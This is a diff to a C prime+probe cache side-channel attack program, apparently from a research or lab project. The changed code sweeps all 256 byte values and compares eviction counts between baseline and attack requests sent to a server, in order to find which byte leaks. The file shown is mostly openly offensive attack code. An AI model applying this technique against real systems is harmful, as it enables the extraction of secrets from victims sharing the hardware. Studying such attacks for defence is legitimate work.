@@ -20,7 +20,7 @@
 #define HUGE_PAGE_SIZE (2 * 1024 * 1024) // 2mb
 
 // prime+probe
-#define ATTACK_RUNS 10000
+#define ATTACK_RUNS 500
 #define EVICTION_THRESHOLD 7000
 #define CACHE_STRIDE 4096
 #define PROBE_SIZE (256 * 1024 * 1024) // 256mb
@@ -47,9 +47,8 @@ int main(int argc, char* argv[]) {
     probe_arr_setup();
     printf("Probe array base address: %p\n", (void*)probe_head);
 
-    uint8_t target_byte = 0x23;
-    node_t *probe_arr = build_linked_list(target_byte);
-
+    node_t *cal_list = build_linked_list(0x00); // Build a dummy list
+    calibrate_threshold(cal_list);
     // threshold for classifying cache miss
     c_threshold = EVICTION_THRESHOLD;
 
@@ -72,51 +71,63 @@ int main(int argc, char* argv[]) {
     //     }
     // }
     // _mm_mfence();
+    int max = 0;
+    uint8_t spiking_byte;
+    for (int i = 0; i < 256; i++){ // from byte 0x00 - 0xFF
+        uint8_t target_byte = (uint8_t)i;
+        node_t *probe_arr = build_linked_list(target_byte);
     
-    int baseline_count = 0;
-    int attack_count = 0;
-    for (int j = 0; j < ATTACK_RUNS; j++) {
+        int baseline_count = 0;
+        int attack_count = 0;
+        for (int j = 0; j < ATTACK_RUNS; j++) {
 
-        //PRIME
-        prime_cache(probe_arr);
+            //PRIME
+            prime_cache(probe_arr);
 
-        // BASELINE
-        send(clientfd, baseline_data, strlen(baseline_data), 0);
-        int n = -1;
-        while (n < 0) {
-            n = recv(clientfd, buf, sizeof(buf), 0); // deetct response started
+            // BASELINE
+            send(clientfd, baseline_data, strlen(baseline_data), 0);
+            int n = -1;
+            while (n < 0) {
+                n = recv(clientfd, buf, sizeof(buf), 0); // deetct response started
+            }
+
+            //PROBE
+            check_cache_presence(probe_arr, &baseline_count);
+
+            while (n > 0) {
+                n = recv(clientfd, buf, sizeof(buf), 0); // drain socket buf
+            }
+
+            // = ATTACK =
+            //PRIME
+            prime_cache(probe_arr);
+
+            // ATTACK
+            send(clientfd, attack_data, strlen(attack_data), 0);
+            
+            n = -1;
+            while (n < 0) {
+                n = recv(clientfd, buf, sizeof(buf), 0); // detect response started
+            }
+
+            //PROBE
+            check_cache_presence(probe_arr, &attack_count);
+
+            while (n > 0) {
+                n = recv(clientfd, buf, sizeof(buf), 0); // drain socket
+            }
+        } 
+        int diff = attack_count - baseline_count;
+        if (diff > max){
+            max = diff;
+            spiking_byte = target_byte;
         }
-
-        //PROBE
-        check_cache_presence(probe_arr, &baseline_count);
-
-        while (n > 0) {
-            n = recv(clientfd, buf, sizeof(buf), 0); // drain socket buf
+        if(diff > 0){
+            printf("\n===== EVICTION COUNT FOR BYTE %x =====\n", target_byte);
+            printf("\n- COUNT: %d misses\n- ATTACK: %d misses\n- BASELINE: %d misses\n", diff, attack_count, baseline_count);
         }
-
-        // = ATTACK =
-        //PRIME
-        prime_cache(probe_arr);
-
-        // ATTACK
-        send(clientfd, attack_data, strlen(attack_data), 0);
-        
-        n = -1;
-        while (n < 0) {
-            n = recv(clientfd, buf, sizeof(buf), 0); // detect response started
-        }
-
-        //PROBE
-        check_cache_presence(probe_arr, &attack_count);
-
-        while (n > 0) {
-            n = recv(clientfd, buf, sizeof(buf), 0); // drain socket
-        }
-    } 
-
-    printf("\n===== EVICTION COUNT FOR BYTE %x =====\n", target_byte);
-    int diff = attack_count - baseline_count;
-    printf("\n- COUNT: %d misses\n- ATTACK: %d misses\n- BASELINE: %d misses\n", diff, attack_count, baseline_count);
+    }
+    printf("\nLargest Spike Byte: %x (%d)\n", spiking_byte, max);
 
     close(clientfd);
     return 0;
@@ -169,8 +180,8 @@ node_t* build_linked_list(uint8_t target_byte){
 
 // Prime LLC
 void prime_cache(node_t *base_ptr){
-    // loops through pointer array for a byte 3 times
-    for(int i = 0; i < 3; i++){
+    // loops through pointer array for a byte 10 times
+    for(int i = 0; i < 10; i++){
         node_t *current = base_ptr;
         while (current != NULL){
             current = current->next;
